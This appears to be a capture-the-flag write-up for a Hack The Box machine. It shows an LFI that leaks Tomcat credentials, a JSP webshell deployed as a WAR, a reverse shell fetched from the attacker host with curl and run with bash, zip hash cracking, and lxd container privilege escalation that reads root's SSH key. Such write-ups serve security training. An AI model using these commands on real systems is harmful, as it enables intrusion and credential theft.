nmap shows ssh, 80, 8080 open
page 8080 just tells us there's a `/etc/tomcat9/tomcat-users.xml` page
page 80 seems pretty straighforward until we see a /news.php?file=statement
This immediately gives hint for LFI
we try ?file=/etc/passwd ?file=../etc/passwd ?file=../../../etc/passwd and we have a winner
Looking at tomcat9 installation stuff, itshowed a couple of default installation locations, one of which was /usr/share. lookin at the google results file structure for /usr/share/tomcat9 directory, we see the /usr/share/tomcat9/etc/tomcat-users.xml.
Upon LFI, we find the creds  username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"

Now, we have access to admin-gui, but it is only available from the same host where it is hosted, which is the server, and 8009, proxy for tomcat is also down.
So we use cmdline to interract with /manager/text/deply (This is where we can deploy war files in the gui webpage) using curl -T to upload a file
get the cmdjsp.jsp from /opt/webshells/jsp
change the method to POST, change the cmd to linux cmd
`zip rev.war cmdjsp.jsp`
`curl -T rev.war -u 'tomcat:$3cureP4s5w0rd123!' http://megahosting.htb:8080/manager/text/deploy?path=/ajpath&update=true`
The update=true ensure any existing project will be undeployed before mine gets deployed

Then visit megahosting.htb:8080/ajpath/cmdjsp.jsp to interact with the webshell
we can normally make the webshell send a reverse shell to us, but not in this case.
So we host a bash rev shell on python, have the webshell curl our webshell, and in the next command, run the revshell
`curl http://10.10.14.34/rshell.sh -o /tmp/sh`
`bash /tmp/sh` while listening on nc,
and shell!

---
/var/www/hmtl had a backup.zip file, which needed a password to unzip
sent it to kali, `zip2john backup.zip`, put whole has to hash.txt `john hash.txt rockyou`
gave the password admin@it
ssh dint work, but `su - ash` worked

---
id on user ash shows the user belongs to a lxd group
it is a privesc vector
##### **Steps to be performed on the attacker machine**:
- Download build-alpine in your local machine through the git repository.
- Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.
- Transfer the tar file to the host machine
##### **Steps to be performed on the host machine:**
- Download the alpine image
- Import image for lxd
- Initialize the image inside a new container.
- Mount the container inside the /root directory
```zsh kali
cd /opt
sudo git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
#generates an alpine....tar.gz
python -m http.server 80
```

```zsh victim
cd /tmp
wget 10.10.14.34/alpine...ta.gz

lxd init
#press enter for all default prompt questions
lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
lxc image list
lxc init alpine mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true 
lxc list
lxc start mycontainer
lxc exec mycontainer /bin/bash
#id root!!
cat /mnt/root/root/root.txt #to get the root.txt
cat /mnt/root/root/.ssh/id_rsa #to get the private key
```
